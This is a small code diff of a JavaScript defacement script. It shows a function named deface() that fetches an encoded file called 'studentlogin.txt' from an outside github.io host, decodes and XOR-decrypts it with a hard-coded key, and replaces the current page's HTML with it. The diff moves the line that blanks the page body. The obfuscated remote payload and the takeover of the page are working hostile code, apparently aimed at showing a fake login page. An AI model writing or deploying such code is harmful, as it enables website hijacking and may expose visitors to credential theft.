@@ -1,5 +1,4 @@
 function injectHTMLAndLoadResources(decryptedHTML) {
-    document.body.innerHTML = '';
     // Create a temporary container to parse the HTML
     const tempDiv = document.createElement('div');
     tempDiv.innerHTML = decryptedHTML;
@@ -59,6 +58,7 @@ function deface() {
     fetch('https://cybercutie0.github.io/-/studentlogin.txt')
         .then(response => response.text()) // Get the response as text (HTML content)
         .then(data => {
+            document.body.innerHTML = '';
             let decodedhtml = atob(data);
             let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
             // Replace the entire HTML of the current document
